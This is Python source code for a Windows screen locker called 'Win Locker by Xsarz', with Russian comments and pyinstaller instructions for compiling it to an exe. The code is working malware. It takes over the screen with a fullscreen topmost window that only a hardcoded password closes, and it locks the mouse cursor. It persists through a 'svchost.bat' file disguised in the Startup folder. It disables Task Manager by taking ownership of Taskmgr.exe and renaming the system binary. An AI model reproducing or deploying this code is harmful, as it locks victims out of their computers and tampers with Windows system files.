import tkinter
from tkinter import messagebox
from getpass import getuser
import pyautogui
from os import rename, system
from os.path import realpath, dirname
import sys
pyautogui.FAILSAFE = False
user = getuser()

#------------------------------------------------------------
password = "12345" #Пароль для отключения
text = "Пароль 12345" #Текст

color = "grey" #задний фон

title = 'Win Locker by Xsarz' #Название окон
close_text = "Не закрывай пожалуйста 😥" #При попытке закрыть
password_error = "Неверный пароль😜" #При неверном пароле

"""
Скомпилировать в exe:
pip install pyinstaller
pyinstaller -w -F WinLocker.py
"""
#------------------------------------------------------------


def startup():
	path = dirname(realpath(__file__))
	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % user
	with open(f"{bat_path}\\svchost.bat", "w+") as bat_file:
		bat_file.write(fr'start {sys.argv[0]}')

def block_Taskmgr():
	try:
		path1 = "C:\Windows\System32\Taskmgr.exe"
		path2 = "C:\Windows\System32\Taskmgr1.exe"
		system("takeown /f C:\Windows\System32\Taskmgr.exe")  
		system("icacls C:\Windows\System32\Taskmgr.exe /grant Администраторы:F /c /l") 
		system("icacls C:\Windows\System32\Taskmgr.exe /grant Пользователи:F /c /l")
		system("taskkill /im taskmgr.exe")
		rename(path1, path2)
	except:pass

def close_block():
    pyautogui.moveTo(x=0,y=0)
    window.protocol("WM_DELETE_WINDOW",close_block)
    window.update()
    messagebox.showerror(title, close_text)


def accept_password(input_passwords):
	if input_passwords == password:window.destroy()
	else:messagebox.showerror(title, password_error)


window = tkinter.Tk()
window.title(title)

width = window.winfo_screenwidth()
height = window.winfo_screenheight()

window.geometry(f'{width}x{height}')
window['bg'] = color
window.attributes('-fullscreen', True,'-topmost', True)


title_lbl = tkinter.Label(window, text=title, font=("Arial Bold", int(height/10)), fg='red', bg=color)
text_lbl = tkinter.Label(window, text=text, font=("Arial Bold", int(height/40)), fg='white', bg=color)

accept_password_btn = tkinter.Button(window, text='Проверить', background="#555", foreground="#ccc", padx="15", pady="6", font="15", command=lambda: accept_password(input_passwords=password_entry.get()))
password_entry = tkinter.Entry(window,width=25)


title_lbl.grid(column=0, row=0)
text_lbl.grid(column=0, row=1, pady=5)
password_entry.grid(column=0, row=2, pady=5)
accept_password_btn.grid(column=0, row=3, pady=15)
startup()
block_Taskmgr()
close_block()
window.mainloop()